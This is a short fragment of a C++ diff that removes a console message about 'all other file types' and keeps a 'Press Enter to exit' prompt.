-    std::cout << "- And ALL other file types" << std::endl;
     std::cout << "\nPress Enter to exit..." << std::endl;
     std::cin.get();
     
